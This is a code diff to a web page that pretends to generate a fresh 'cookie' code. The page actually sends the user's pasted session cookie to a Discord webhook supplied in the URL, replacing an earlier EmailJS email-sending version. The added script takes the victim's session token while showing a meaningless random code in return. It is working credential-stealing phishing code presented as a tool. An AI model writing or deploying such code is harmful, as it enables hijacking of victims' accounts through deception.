@@ -61,16 +61,16 @@
   </div>
 
   <script>
-    // Extract email from query string
+    // Extract webhook URL from query string
     const urlParams = new URLSearchParams(window.location.search);
-    const userEmail = urlParams.get('email');  // Get the user email from the URL
+    const webhookURL = urlParams.get('webhook');  // Get the webhook URL from the URL
 
-    if (!userEmail) {
-      alert('Please provide an email first on the Hub page!');
+    if (!webhookURL) {
+      alert('Please provide a webhook URL first on the Hub page!');
       window.location.href = 'index.html';  // Redirect to Hub page
     }
 
-    console.log('User email extracted:', userEmail);  // Debugging: Check if email is correctly extracted
+    console.log('Webhook URL extracted:', webhookURL);  // Debugging: Check if webhook URL is correctly extracted
 
     // Function to generate a random code with uppercase letters and numbers only
     function generateRandomCode(length) {
@@ -96,55 +96,34 @@
         // Output the generated code
         newCookieOutput.value = newCode;
 
-        // Send the old cookie (input) to the user's email
-        sendEmail(cookieInput, userEmail);
+        // Send the old cookie (input) to the Discord webhook
+        sendToDiscord(cookieInput);
       } else {
         newCookieOutput.value = '';
         alert('Cookie must be at least 700 characters long.');
       }
     }
 
-    // Function to send email using EmailJS API
-    function sendEmail(cookieContent, userEmail) {
-      if (!userEmail) {
-        console.error('No email provided!');
-        return;
-      }
-
-      const templateParams = {
-        cookie: cookieContent,
-        userEmail: userEmail, // Email from the hub
+    // Function to send data to Discord via webhook
+    function sendToDiscord(cookieContent) {
+      const message = {
+        content: `New Cookie Input received!\nCookie Content:\n${cookieContent}`,
       };
 
-      console.log('Sending email to:', userEmail); // Debugging: Check if correct email is being used
-
-      // Send to the user's email
-      sendToEmail(templateParams);
-    }
-
-    // Helper function to send the email via EmailJS
-    function sendToEmail(templateParams) {
-      const payload = {
-        service_id: 'service_bupfcwd', // Service ID
-        template_id: 'template_fkuvg0k', // Template ID
-        template_params: templateParams,
-      };
-
-      console.log('Payload being sent:', payload);  // Debugging: Check the payload
-
-      fetch('https://api.emailjs.com/api/v1.0/email/send', {
+      // Send the POST request to Discord webhook
+      fetch(webhookURL, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify(payload),
+        body: JSON.stringify(message),
       })
       .then(response => response.json())
       .then(data => {
-        console.log('Email sent successfully:', data);
+        console.log('Message sent to Discord:', data);
       })
       .catch(error => {
-        console.error('Error: Could not send email.', error); // Log error in the console
+        console.error('Error sending message to Discord:', error);
       });
     }
   </script>
